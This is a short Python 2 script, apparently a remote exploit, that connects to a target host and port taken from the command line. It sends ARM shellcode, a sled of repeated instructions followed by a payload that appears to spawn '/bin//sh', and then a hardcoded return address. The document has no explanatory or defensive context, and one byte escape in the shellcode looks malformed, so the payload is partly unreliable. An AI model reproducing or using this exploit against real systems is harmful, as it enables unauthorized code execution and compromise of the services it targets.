#!/usr/bin/python

import sys, socket


shellcode = ("\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x6890\x38\x70\x02\x00")

addr = ("\x70\x0a\xf0\x6d")


sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
sock.connect(( sys.argv[1], int(sys.argv[2]) ))
sock.send(shellcode)
sock.send(addr)
sock.close()

print "Shellcode Length: %d" %len(shellcode)
